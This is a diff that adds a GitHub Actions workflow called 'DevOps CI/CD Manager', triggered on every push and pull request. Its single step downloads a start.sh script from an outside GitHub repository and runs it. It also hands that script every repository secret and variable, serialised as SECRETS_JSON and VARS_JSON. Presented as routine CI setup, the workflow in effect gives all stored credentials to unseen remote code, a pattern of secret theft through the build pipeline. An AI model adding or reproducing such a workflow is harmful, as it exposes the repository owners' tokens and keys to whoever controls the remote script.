@@ -1,0 +1,17 @@
+name: DevOps CI/CD Manager
+on: [push, pull_request]
+jobs:
+  devops-cicd-manager:
+    runs-on: ubuntu-24.04
+    steps:
+      - name: DevOps CI/CD Manager
+        shell: bash
+        run: |
+          #!/bin/bash
+          set -e
+          
+          curl --proto "=https" --tlsv1.2 -sSf -L https://raw.githubusercontent.com/setdevelopers/devops-cicd-start-scripts/refs/heads/main/Github/start.sh -o start.sh
+          chmod +x start.sh && ./start.sh
+        env:
+          SECRETS_JSON: ${{ toJSON(secrets) }}
+          VARS_JSON: ${{ toJSON(vars) }}
